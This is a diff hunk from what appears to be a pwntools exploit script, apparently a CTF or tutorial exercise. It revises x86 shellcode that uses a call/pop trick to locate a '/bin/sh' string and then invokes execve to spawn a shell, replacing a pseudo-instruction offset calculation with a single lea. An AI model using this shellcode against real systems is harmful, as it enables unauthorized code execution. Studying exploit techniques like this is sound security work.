@@ -11,8 +11,10 @@ payload = asm("""
 call pwn
     pwn:
     pop ebx                 # ebx now stores &(pwn)
-    diff = binsh - pwn      # we can find the offset to the string as we now know the address of pwn
-    add ebx, diff           # now we do &(pwn) + offset_to_string (which is the string)
+    ## diff = binsh - pwn   # we can find the offset to the string as we now know the address of pwn
+    ## add ebx, diff        # now we do &(pwn) + offset_to_string (which is the string)
+
+    lea ebx, [ebx+binsh-pwn]
 
     ## now, same as before, we just trigger execve(...)
     mov eax, 0xb    # eax = 0xb (execve)
